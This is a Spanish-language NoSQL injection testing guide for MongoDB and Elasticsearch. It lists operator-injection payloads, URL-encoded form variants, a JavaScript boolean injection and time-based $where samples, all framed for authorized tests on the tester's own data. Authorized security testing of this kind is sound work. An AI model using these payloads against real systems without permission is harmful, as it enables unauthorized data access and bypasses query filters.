# 🗡️ NoSQL injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Operadores en campo que debería ser cadena

```jsonl
{"name":{"$ne":"prueba-inexistente"}}
{"name":{"$eq":"prueba-123"}}
{"name":{"$in":["prueba-123","prueba-456"]}}
```

**Cuándo usarlo:** Una línea JSON por solicitud sobre registros propios. Que el servidor acepte operadores puede ser funcionalidad documentada; comparar con cadena literal.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).


### Regex anclada y literal de control

```jsonl
{"name":"prueba-123"}
{"name":{"$regex":"^prueba-123$"}}
{"name":{"$regex":"^prueba-"}}
```

**Cuándo usarlo:** Solicitudes separadas. Acotar prefijos a datos propios; las regex no deben usarse para enumerar cuentas ajenas.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).


## 🧭 Payloads por contexto

### Formulario con corchetes y operador

```text
name=prueba-123
name%5B%24ne%5D=prueba-inexistente
name%5B%24regex%5D=%5Eprueba-123%24
```

**Cuándo usarlo:** Cada línea es un cuerpo application/x-www-form-urlencoded. Solo aplica si el framework transforma corchetes en objetos; comparar con JSON y contrato de API.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).


### Tipos y selectores inesperados

```jsonl
{"name":true}
{"name":["prueba-123"]}
{"name":{"$exists":true}}
{"price":{"$gt":1,"$lt":3}}
```

**Cuándo usarlo:** Una línea por solicitud. Los tipos u operadores deben rechazarse si el contrato exige escalares; confirmar alteración real del filtro.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).


## 🔥 Payloads avanzados

### $where sin efectos laterales en laboratorio

```jsonl
{"$where":"this.name === 'prueba-123'"}
{"$where":"this.name === 'prueba-inexistente'"}
```

**Cuándo usarlo:** Solo MongoDB con $where habilitado y permiso específico. El contraste se hace sobre un documento propio; no ejecutar bucles ni JavaScript externo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).


## 🔬 Pruebas guiadas por escenario

### 1. Operador $ne en campo escalar

**Objetivo:** Usar búsqueda de objetos propios; el esquema debería esperar una cadena.

```json
{"name":{"$ne":"prueba-inexistente"}}
```

**Interpretación:** Una respuesta más amplia solo sugiere que se interpretó un operador; controlar con valor literal.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 2. Rango $gt/$lt

**Objetivo:** Probar un filtro numérico de datos de laboratorio con valores acotados.

```json
{"price":{"$gt":1,"$lt":3}}
```

**Interpretación:** El servidor debería rechazar objetos si solo admite un precio exacto; verificar conjunto esperado.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 3. Expresión regular anclada

**Objetivo:** Usar un nombre de cuenta u objeto propio, sin enumerar terceros.

```json
{"name":{"$regex":"^prueba-123$"}}
```

**Interpretación:** Distinguir soporte legítimo de regex de inyección mediante contrato de API.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 4. Operador $in

**Objetivo:** Comparar dos identificadores de objetos controlados para detectar filtros ampliados.

```json
{"name":{"$in":["prueba-123","prueba-456"]}}
```

**Interpretación:** Que se acepten listas puede ser funcionalidad; hay fallo si se trató como cadena y se salta una restricción.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 5. Operadores en formulario urlencoded

**Objetivo:** Solo si el framework parsea claves con corchetes a objetos, como algunas pilas Node/PHP.

```http
POST /api/search HTTP/1.1
Host: {ORIGEN}
Content-Type: application/x-www-form-urlencoded

name%5B%24ne%5D=prueba-inexistente
```

**Interpretación:** Comparar con name=prueba-inexistente; no extrapolar de JSON al parser de formularios.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 6. Tipo booleano inesperado

**Objetivo:** Comprobar que el filtro de string no acepta booleanos u objetos.

```json
{"name":true}
```

**Interpretación:** Una respuesta distinta puede ser coerción normal; demostrar cambio de criterio de búsqueda.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 7. $where inocuo en laboratorio

**Objetivo:** MongoDB con $where habilitado y permiso expreso; no usar bucles ni exfiltración.

```json
{"$where":"this.name === 'prueba-123'"}
```

**Interpretación:** Una consulta aceptada solo importa si el operador proviene del cliente y cambia el filtro previsto.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 8. $exists sobre campo esperado escalar

**Objetivo:** Filtrar datos de prueba; el backend no debería aceptar un objeto operador en lugar de texto.

```json
{"name":{"$exists":true}}
```

**Interpretación:** Puede ser funcionalidad de búsqueda avanzada; demostrar el contrato y el resultado no permitido.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 9. $nin en filtro de prueba

**Objetivo:** Comparar una exclusión de dos valores controlados con igualdad literal.

```json
{"name":{"$nin":["prueba-123","prueba-456"]}}
```

**Interpretación:** Si aparecen objetos que el usuario no debería consultar, confirmar además autorización por objeto.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md).

### 10. Sintaxis JavaScript booleana en string

**Objetivo:** Solo si el backend concatena una categoría propia dentro de una expresión JavaScript para consultar MongoDB.

```http
GET /api/items?category=prueba%27%20%26%26%201%20%26%26%20%27x HTTP/1.1
Host: {ORIGEN}

GET /api/items?category=prueba%27%20%26%26%200%20%26%26%20%27x HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** El diferencial verdadero/falso debe afectar la selección de objetos propios; la respuesta 400 por sintaxis no confirma inyección.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).

### 11. Filtro compuesto $or

**Objetivo:** El endpoint esperaba un valor exacto y el tester controla dos documentos de prueba.

```json
{"$or":[{"name":"prueba-123"},{"name":"prueba-456"}]}
```

**Interpretación:** Si el cliente introduce el operador y amplía resultados, probar el contrato y la autorización de cada objeto.

**Fuente técnica:** [www.mongodb.com](https://www.mongodb.com/docs/manual/reference/operator/query/or/).

### 12. $elemMatch en arreglo anidado

**Objetivo:** Usar documentos propios con un arreglo `tags`; la API esperaba una etiqueta literal.

```json
{"tags":{"$elemMatch":{"label":"prueba-123","active":true}}}
```

**Interpretación:** La coincidencia de un elemento completo difiere de comparar una cadena; confirmar que no sea una búsqueda avanzada permitida.

**Fuente técnica:** [www.mongodb.com](https://www.mongodb.com/docs/manual/reference/operator/query/elemmatch/).

### 13. $where ciego por tiempo corto

**Objetivo:** Solo laboratorio MongoDB con JavaScript de servidor habilitado y un único documento de prueba.

```json
{"$where":"if (this.name === 'prueba-123') { sleep(500); } return true;"}
```

**Interpretación:** Comparar con nombre falso y pocas repeticiones. La pausa de 500 ms no debe usarse contra colecciones grandes.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/nosql-injection).

### 14. Sintaxis query_string de Elasticsearch

**Objetivo:** Solo si el buscador espera texto literal pero lo pasa a `query_string`; dos nombres son del tester.

```text
name:prueba-123 OR name:prueba-456
```

**Interpretación:** Dos resultados frente a búsqueda literal sugieren que se interpretaron operadores; validar si el lenguaje de búsqueda está documentado.

**Fuente técnica:** [www.elastic.co](https://www.elastic.co/docs/reference/query-languages/query-dsl/query-dsl-query-string-query).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
